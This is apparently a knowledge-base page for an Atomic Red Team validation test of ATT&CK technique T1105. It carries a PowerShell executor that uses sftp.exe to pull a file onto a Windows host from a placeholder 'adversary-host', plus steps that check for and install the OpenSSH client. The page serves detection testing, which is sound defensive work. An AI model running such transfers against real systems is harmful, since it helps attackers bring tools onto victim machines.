---
atomic_guid: "3d25f1f2-55cb-4a41-a523-d17ad4cfba19"
title: "Windows pull file using sftp.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "3d25f1f2-55cb-4a41-a523-d17ad4cfba19"
  - "Windows pull file using sftp.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Windows pull file using sftp.exe

This test simulates pulling files using SFTP on a Windows environment.

## Metadata

- Atomic GUID: 3d25f1f2-55cb-4a41-a523-d17ad4cfba19
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_path

- description: Local path to receive files
- type: path
- default: C:\temp

### remote_host

- description: Remote host to pull from
- type: string
- default: adversary-host

### remote_path

- description: Path of file to pull
- type: path
- default: /tmp/T1105.txt

### username

- description: User account to authenticate on remote host
- type: string
- default: adversary

## Dependencies

This test requires the `sftp` command to be available on the system.

### Prerequisite Check

```powershell
if (Get-Command sftp -ErrorAction SilentlyContinue) {
    Write-Output "SFTP command is available."
    exit 0
} else {
    Write-Output "SFTP command is not available."
    exit 1
}
```

### Get Prerequisite

```powershell
# Define the capability name for OpenSSH Client
$capabilityName = "OpenSSH.Client~~~~0.0.1.0"
try {
    # Install the OpenSSH Client capability
    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
    Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
} catch {
    # Handle any errors that occur during the installation process
    Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
}
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
